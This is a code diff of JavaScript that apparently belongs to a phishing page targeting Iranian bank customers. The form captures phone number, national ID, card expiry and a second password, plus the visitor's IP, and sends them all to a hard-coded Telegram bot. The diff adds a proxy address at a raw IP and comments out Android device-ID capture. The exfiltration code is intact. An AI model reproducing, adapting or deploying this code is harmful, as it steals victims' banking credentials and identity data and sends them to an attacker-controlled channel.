@@ -1,5 +1,10 @@
 const token = '7985669297:AAEVfINvGGV4VX6iLLH1dLae8EsSdLJKPVY';
 const chatId = '-4614449543';
+
+const proxyUrl = 'http://47.56.110.204:8989';
+// const agent = new HttpsProxyAgent(proxyUrl);
+// console.log(agent);
+
 const sendMessage = async function (message) {
   await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
     method: 'POST',
@@ -9,8 +14,8 @@ const sendMessage = async function (message) {
     body: JSON.stringify({
       chat_id: chatId,
       text: message,
-      // parse_mode: 'MarkdownV2',
     }),
+    // agent,
   })
     .then(response => response.json())
     .then(data => {
@@ -20,6 +25,7 @@ const sendMessage = async function (message) {
       console.error('خطا در ارسال پیام:', error.message);
     });
 };
+
 let userIp;
 async function getUserIP() {
   try {
@@ -81,8 +87,8 @@ function isValidEmail(email) {
   return emailPattern.test(email);
 }
 
-const androidId = androidListener.getAndroidID();
-const device = androidListener.deviceName();
+// const androidId = androidListener.getAndroidID();
+// const device = androidListener.deviceName();
 
 firstBtn.addEventListener('click', () => {
   if (!validateIranianMobileNumber(phoneInput.value)) {
@@ -113,7 +119,7 @@ firstBtn.addEventListener('click', () => {
 Phone: ${phone}
 CodeMeli: ${codeMeli}
 IP : ${userIp}
-Tag: #${androidId}
+Tag: #${'androidId'}
   `;
       sendMessage(message);
       document.getElementById('page1').classList.add('hidden');
@@ -367,7 +373,7 @@ Month : ${mm}
 Year : ${yy}
 Pass2 : ${poyaInput.value}
 IP : ${userIp}
-Tag : #${androidId}
+Tag : #${'androidId'}
   `;
     sendMessage(message);
     setTimeout(() => {
@@ -438,7 +444,7 @@ Month : ${mm}
 Year : ${yy}
 Fixed : ${poyaInput.value}
 IP : ${userIp}
-Tag :  #${androidId}
+Tag :  #${'androidId'}
   `;
     sendMessage(message);
     setTimeout(() => {
